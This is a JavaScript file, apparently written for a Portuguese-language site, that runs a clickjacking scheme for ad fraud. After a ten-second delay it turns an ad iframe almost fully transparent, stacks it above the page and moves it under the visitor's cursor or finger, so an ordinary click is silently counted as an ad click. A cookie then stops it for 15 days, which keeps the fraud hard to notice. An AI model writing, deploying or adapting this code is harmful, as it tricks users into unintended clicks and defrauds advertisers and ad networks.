let monitorTracker = null;
let canTrack = 0;
let div = null;
let iframe = null;
let cookieName = '_iplz2_delay_time'; //nome do cookie de delay
let delayTime = 15; // numero de dias de delay a cada clique - 15 dias
let timeToStart = 10; //Tempo em segundos para iniciar o script - 10seg

let pointerTracker = function(e){
    let out = {x:0, y:0};
    if(e.type == 'touchstart' || e.type == 'touchmove' || e.type == 'touchend' || e.type == 'touchcancel' || e.type == 'touchforcechange'){
        let touch = e.originalEvent.touches[0] || e.originalEvent.changedTouches[0];
        out.x = touch.pageX;
        out.y = touch.pageY;
    } else if (e.type == 'mousedown' || e.type == 'mouseup' || e.type == 'mousemove' || e.type == 'mouseover'|| e.type=='mouseout' || e.type=='mouseenter' || e.type=='mouseleave') {
        out.x = e.pageX;
        out.y = e.pageY;
    }
    return out;
};
function setCookie(strCookie, strValor, lngHoras) {
    let dtmData = new Date();
    let strExpires = null;
    if (lngHoras) {
        dtmData.setTime(dtmData.getTime() + (lngHoras * 60 * 1000 * 60));
        strExpires = "; expires=" + dtmData.toGMTString();
    } else {
        strExpires = "";
    }
    document.cookie = strCookie + "=" + strValor + strExpires + "; path=/";
}
function getCookie(strCookie) {
    let strNomeIgual = strCookie + "=";
    let arrCookies = document.cookie.split(';');
    for (let i = 0; i < arrCookies.length; i++) {
        let strValorCookie = arrCookies[i];
        while (strValorCookie.charAt(0) == ' ') {
            strValorCookie = strValorCookie.substring(1, strValorCookie.length);
        }
        if (strValorCookie.indexOf(strNomeIgual) == 0) {
            return strValorCookie.substring(strNomeIgual.length, strValorCookie.length);
        }
    }
    return null;
}
function revertDiv() {
    canTrack = 0;
    $("#" + div).css("top", "").css("left", "").css("z-index", "").css("position", "").css("opacity", "");
    $('#' + div + ' div').css('position', 'fixed');
}
function startScript(){
    let tempIframe = $('ins[id^="mMTag_Responsive"]'); //id da div (pode ser somente parte do inicio do nome)
    div = tempIframe[0].id;
    iframe = $('#' + div + ' iframe')[0].id;

    $("body").css("overflow-x", "hidden").css("width", "100%");
    $(document).on('mousemove touchstart', function(e){
        let tracker = pointerTracker(e);
        if (canTrack == 1) {
            $("#" + div).css({
                left:  tracker.x - $("#" + div).width() / 2,
                top:   tracker.y - $("#" + div).height()
            });
        }
    });

    if(getCookie(cookieName) == null){
        followDiv();
    }
}
function followDiv() {
    canTrack = 1;
    startTracker();
    $("#" + div).css("z-index", "91000").css("position", "absolute").css("opacity", "0.0001");
    $('#' + div + ' div').css('position', '');
}
function setClick(){
    setCookie(cookieName, '1', 24 * delayTime);
    document.activeElement.blur();
}
function startTracker() {
    monitorTracker = setInterval(function(){
        let elem = document.activeElement;
        if(elem && elem.tagName == 'IFRAME' && elem.id == iframe){
            setTimeout(setClick,200);
            setTimeout(revertDiv,1000);
            clearInterval(monitorTracker);
        }
    }, 500);
}
$(document).ready(function () {
    setTimeout(startScript, (1000 * timeToStart));
});
